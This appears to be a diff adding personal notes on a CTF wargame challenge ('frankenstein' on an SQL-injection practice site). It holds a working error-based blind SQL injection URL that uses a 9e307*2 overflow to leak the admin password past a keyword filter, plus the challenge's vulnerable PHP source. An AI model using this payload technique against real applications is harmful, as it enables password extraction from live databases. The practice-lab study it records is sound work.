@@ -1,0 +1,24 @@
+error-based sqli:
+9e307*2: MySQL: ERROR 1690 (22003): DOUBLE value is out of range in '(9e307 * 2)'
+-----------------
+
+https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw=%27%7C%7Cid=%27admin%27%20and%20case%20when%20pw%20like%20%270%25%27%20then%209e307*2%20else%200%20end%23
+
+FRANKENSTEIN Clear!
+query : select id,pw from prob_frankenstein where id='frankenstein' and pw=''||id='admin' and case when pw like '%' then 9e307*2 else 0 end#'
+<?php
+  include "./config.php";
+  login_chk();
+  $db = dbconnect();
+  if(preg_match('/prob|_|\.|\(|\)|union/i', $_GET[pw])) exit("No Hack ~_~");
+  $query = "select id,pw from prob_frankenstein where id='frankenstein' and pw='{$_GET[pw]}'";
+  echo "<hr>query : <strong>{$query}</strong><hr><br>";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(mysqli_error($db)) exit("error");
+
+  $_GET[pw] = addslashes($_GET[pw]);
+  $query = "select pw from prob_frankenstein where id='admin' and pw='{$_GET[pw]}'";
+  $result = @mysqli_fetch_array(mysqli_query($db,$query));
+  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("frankenstein");
+  highlight_file(__FILE__);
+?>
